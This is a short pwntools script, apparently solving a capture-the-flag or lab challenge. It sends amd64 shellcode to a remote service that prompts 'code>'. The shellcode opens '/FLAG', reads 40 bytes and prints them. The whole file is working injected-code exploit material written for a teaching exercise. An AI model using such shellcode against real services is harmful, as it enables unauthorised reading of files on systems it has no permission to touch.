#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

port = 10257

r = remote('up.zoolab.org', port)

asm_code = """
mov rax, 0x00000047414c462f
push rax

mov rax, 0x02
mov rdi, rsp
mov rsi, 0
syscall

mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx

mov rdi, rax
mov rax, 0x0
mov rsi, rsp
mov rdx, 40
syscall

mov rax, 0x1
mov rdi, 0x1
syscall

mov rax, 0x3c
mov rdi, 0x0
syscall
"""

sc = asm(asm_code, arch='amd64')

r.sendafter(b"code> ", sc)
print(r.recvuntil(b'}'))
